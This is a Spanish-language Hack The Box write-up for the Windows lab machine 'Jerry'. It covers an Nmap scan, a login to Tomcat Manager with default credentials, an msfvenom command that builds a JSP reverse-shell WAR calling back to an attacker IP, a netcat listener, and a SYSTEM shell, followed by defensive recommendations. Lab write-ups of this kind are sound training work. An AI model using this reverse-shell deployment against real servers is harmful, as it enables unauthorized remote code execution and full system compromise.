# Jerry — Hack The Box

**Plataforma:** Hack The Box  
**Dificultad:** 🟢 Fácil  
**SO:** Windows  
**Autor de la máquina:** mr_me  
**Fecha de resolución:** 2026  
**Técnicas:** Nmap · Apache Tomcat · Tomcat Manager · WAR Deployment · msfvenom · Reverse Shell · Windows Enumeration

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración del servicio web](#2-enumeración-del-servicio-web)
3. [Acceso inicial — Apache Tomcat](#3-acceso-inicial--apache-tomcat)
4. [Obtención de shell](#4-obtención-de-shell)
5. [Post-explotación y flags](#5-post-explotación-y-flags)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Reconocimiento

Comenzamos comprobando conectividad con la máquina objetivo mediante ICMP.

```bash
ping -c 1 10.10.X.X
```

Salida obtenida:

```text
64 bytes from 10.10.X.X: icmp_seq=1 ttl=127 time=35.2 ms
```

> 💡 El parámetro `-c 1` envía un único paquete ICMP. Solo necesitamos verificar conectividad. El valor `TTL=127` suele indicar que estamos frente a una máquina Windows.

---

### Escaneo inicial de puertos

Realizamos un escaneo completo de todos los puertos TCP con Nmap.

```bash
nmap -sS -Pn -vvv --min-rate 5000 --open -n -p- 10.10.X.X -oN allPorts
```

### Explicación de parámetros utilizados

| Parámetro | Función |
|---|---|
| `-sS` | SYN Scan rápido y sigiloso |
| `-Pn` | Omite descubrimiento por ping |
| `-vvv` | Máximo nivel de verbosidad |
| `--min-rate 5000` | Fuerza velocidad mínima de paquetes |
| `--open` | Muestra solo puertos abiertos |
| `-n` | Evita resolución DNS |
| `-p-` | Escanea los 65535 puertos TCP |
| `-oN` | Guarda el resultado en formato normal |

Resultado relevante:

```text
8080/tcp open  http-proxy
```

> 💡 El puerto 8080 suele estar asociado a paneles web, proxys o servicios Java como Apache Tomcat.

---

### Enumeración detallada

Una vez identificado el puerto abierto, realizamos un escaneo más profundo.

```bash
nmap -sCV -T5 -p8080 10.10.X.X
```

Salida relevante:

```text
8080/tcp open  http
|_http-title: Apache Tomcat
| http-server-header: Apache-Coyote/1.1
```

### Explicación de parámetros

| Parámetro | Función |
|---|---|
| `-sCV` | Ejecuta detección de versiones y scripts NSE |
| `-T5` | Timing agresivo para acelerar el escaneo |

---

## 2. Enumeración del servicio web

Accedemos desde el navegador al puerto `8080`.

```text
http://10.10.X.X:8080
```

Encontramos una instancia antigua de Apache Tomcat.

```md
![Tomcat](images/tomcat_home.png)
```

Apache Tomcat es un servidor de aplicaciones Java utilizado para desplegar aplicaciones web JSP y servlets.

---

### Enumeración de Tomcat Manager

Probamos acceso al panel administrativo:

```text
http://10.10.X.X:8080/manager/html
```

```md
![Manager Login](images/tomcat_manager_login.png)
```

La propia página sugiere credenciales por defecto o comunes. Probamos:

```text
Usuario: tomcat
Contraseña: s3cret
```

Y conseguimos acceso válido al panel de administración.

```md
![Manager Access](images/tomcat_manager_access.png)
```

> 💡 El uso de credenciales débiles o por defecto en Tomcat es una vulnerabilidad extremadamente común en entornos mal configurados.

---

## 3. Acceso inicial — Apache Tomcat

Dentro del panel observamos que podemos desplegar aplicaciones `.WAR`.

```md
![WAR Upload](images/war_upload.png)
```

Esto es crítico, ya que permite subir aplicaciones Java arbitrarias al servidor.

---

### Generación del payload

Buscamos payloads Java compatibles con Tomcat usando `msfvenom`.

```bash
msfvenom -l payloads | grep java
```

Resultado parcial:

```text
java/jsp_shell_reverse_tcp
```

> 💡 Una reverse shell permite que la víctima inicie una conexión hacia nuestra máquina atacante, proporcionando una shell interactiva remota.

---

### Creación del archivo WAR malicioso

Generamos un payload WAR con reverse shell.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.63 LPORT=443 -f war -o shell.war
```

### Explicación del payload

| Parámetro | Función |
|---|---|
| `-p java/jsp_shell_reverse_tcp` | Payload reverse shell JSP |
| `LHOST` | IP del atacante |
| `LPORT` | Puerto de escucha |
| `-f war` | Formato WAR compatible con Tomcat |
| `-o shell.war` | Nombre del archivo generado |

---

## 4. Obtención de shell

Antes de ejecutar el payload, iniciamos un listener con Netcat.

```bash
nc -lvnp 443
```

### Explicación

| Parámetro | Función |
|---|---|
| `-l` | Modo escucha |
| `-v` | Verbose |
| `-n` | No resuelve DNS |
| `-p 443` | Puerto de escucha |

---

### Despliegue del payload

Subimos el archivo `shell.war` desde el panel Tomcat Manager.

```md
![WAR Deploy](images/war_deploy.png)
```

Tras desplegarlo, aparece listado entre las aplicaciones disponibles.

```md
![Shell Application](images/shell_application.png)
```

Ejecutamos la aplicación accediendo desde el navegador.

Inmediatamente obtenemos conexión en nuestro listener:

```text
Microsoft Windows [Version ...]
C:\apache-tomcat>
```

Comprobamos privilegios:

```cmd
whoami
```

Resultado:

```text
nt authority\system
```

```md
![SYSTEM](images/system_shell.png)
```

> 💡 `NT AUTHORITY\SYSTEM` es la cuenta más privilegiada de Windows, equivalente a `root` en Linux.

✅ Compromiso total de la máquina.

---

## 5. Post-explotación y flags

Con privilegios máximos, solo queda localizar las flags del sistema.

Normalmente se encuentran en:

```text
C:\Users\<usuario>\Desktop\
```

Y para administrador:

```text
C:\Users\Administrator\Desktop\
```

Enumeramos directorios hasta localizar ambas flags.

```md
![Flags](images/flags.png)
```

✅ Máquina completada.

---

## 6. Lección aprendida

Esta máquina demuestra una cadena de fallos extremadamente común en entornos reales.

| Vulnerabilidad | Dónde | Impacto |
|---|---|---|
| Credenciales débiles | `/manager/html` | Acceso administrativo no autorizado |
| Apache Tomcat expuesto | Puerto 8080 | Superficie de ataque accesible |
| Despliegue WAR permitido | Tomcat Manager | Ejecución remota de código |
| Reverse shell JSP | Aplicación WAR | Compromiso total del sistema |
| Servicio ejecutándose como SYSTEM | Windows | Escalada implícita a máximo privilegio |

---

## Recomendaciones defensivas

- Nunca exponer Tomcat Manager públicamente.
- Cambiar credenciales por defecto inmediatamente.
- Restringir acceso al panel administrativo mediante firewall o VPN.
- Deshabilitar despliegue WAR innecesario.
- Ejecutar servicios con cuentas de bajo privilegio.
- Monitorizar uploads sospechosos en aplicaciones Java.
- Implementar segmentación de red y hardening de servicios.

---

*Writeup por [Arabot](https://github.com/Caan31) · Hack The Box · 2026*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
